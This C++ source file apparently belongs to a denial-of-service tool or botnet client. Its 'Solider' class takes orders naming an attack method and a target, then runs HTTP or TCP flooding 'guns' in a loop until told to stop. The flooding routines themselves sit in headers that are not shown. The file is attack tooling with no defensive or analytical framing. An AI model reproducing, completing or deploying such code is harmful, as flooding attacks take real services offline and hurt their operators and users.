#include "solider.h"

#include "http_gun.h"
#include "tcp_gun.h"
#include "api_interface.h"
#include "globals.h"

void Solider::ExecuteOrders(const TaskController &task, Informator::AttackMethod method, Attackers::Target target)
{
	switch (method)
	{
		case Informator::AttackMethod::HTTPAttack:
		{
			Attackers::HTTPGun http{task};
			while(!task.ShouldStop())
			{
				http.FireTillDead({target.address, 0});
			}
			break;
		}
		case Informator::AttackMethod::TCPAttack:
		{
			Attackers::TCPGun tcp{task};

			while(!task.ShouldStop())
			{
				tcp.FireWithoutProxy(target);
			}
			break;
		}
		case Informator::AttackMethod::UDPAttack:
		{
			throw std::runtime_error("Not implemented");
		}
	}
}
